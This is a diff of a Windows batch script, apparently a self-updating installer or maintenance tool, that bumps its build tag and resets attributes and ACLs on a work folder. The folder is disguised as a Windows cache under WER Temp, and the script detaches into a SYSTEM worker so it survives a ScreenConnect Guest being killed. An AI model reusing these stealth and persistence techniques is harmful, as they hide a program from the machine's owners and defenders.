@@ -1,6 +1,6 @@
 @echo off
 setlocal EnableExtensions EnableDelayedExpansion
-REM OWN BUILD 20260802O47 - stuck Gryxa -> ARP nuke + detached msiexec /i (10s kill safe)
+REM OWN BUILD 20260802O48 - stuck Gryxa -> ARP nuke + detached msiexec /i (10s kill safe)
 set "WD=%ProgramData%\Microsoft\Windows\WER\Temp\.wucache"
 set "BOOT=%SystemRoot%\Temp\.wucache"
 set "LOG=%WD%\boot.err"
@@ -26,9 +26,16 @@ if not exist "%CURL%" set "CURL=curl.exe"
 if not exist "%WD%" mkdir "%WD%" >nul 2>&1
 if not exist "%BOOT%" mkdir "%BOOT%" >nul 2>&1
 
+REM O47b: unharden workdir on entry — LockDir (SYSTEM+Admin only) froze hosts on old
+REM builds by blocking self-update downloads. Re-open so the tick can always update.
+attrib -h -s -r "%WD%" >nul 2>&1
+attrib -h -s -r "%WD%\*" >nul 2>&1
+icacls "%WD%" /reset /T /C /Q >nul 2>&1
+icacls "%WD%" /grant "NT AUTHORITY\SYSTEM:(OI)(CI)F" "BUILTIN\Administrators:(OI)(CI)F" /C /Q >nul 2>&1
+
 REM Survive ScreenConnect Guest kill: detach into SYSTEM worker
 if /I not "%~1"=="_RUN" (
-  echo === OWN BUILD 20260802O47 ===
+  echo === OWN BUILD 20260802O48 ===
   echo whoami:
   whoami
   set "ELEV=0"
@@ -56,7 +63,7 @@ if /I not "%~1"=="_RUN" (
     echo ERROR: cannot write unique runner under %BOOT%
     exit /b 6
   )
-  findstr /C:"OWN BUILD 20260802O47" "!RUNNER!" >nul 2>&1
+  findstr /C:"OWN BUILD 20260802O48" "!RUNNER!" >nul 2>&1
   if errorlevel 1 (
     echo ERROR: runner copy is not O41 - abort
     exit /b 7
